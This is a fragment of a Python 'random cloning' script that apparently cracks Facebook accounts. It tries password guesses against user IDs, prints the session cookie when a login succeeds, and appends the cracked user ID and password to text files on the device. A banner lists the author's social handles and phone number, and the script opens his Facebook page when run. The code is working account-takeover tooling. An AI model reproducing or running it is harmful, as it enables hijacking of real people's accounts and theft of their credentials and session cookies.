...
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/SajidIslam107?/')
logo =("""\033[0;92m
╔════════════════════════════════════════════════╗
...
\033[0;92m╔════════════════════════════════════════════════╗
\033[0;93m╠══[Author:====================> \33[1;38m𝐌𝐫. 𝐒𝐀𝐉𝐈𝐃\33[1;38m        ║\033[1;31m
╠══[Facebook:==================> Sajid Ahmed      ║  \033[1;97m
╠══[Github:=======================> \33[1;38msajid10k      ║\33[1;34m
╠══[Whatsapp:==================> 01795112922      ║\33[1;92m 
╠══[TOOLS:=====================> Random Cloning   ║ \33[1;35m
╠══[VERSION:===================> 1.0.1            ║
\033[0;92m╚════════════════════════════════════════════════╝
    """) 
loop = 0
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝐒𝐀𝐉𝐈𝐃-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE 💉= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Sajid-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Sajid-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
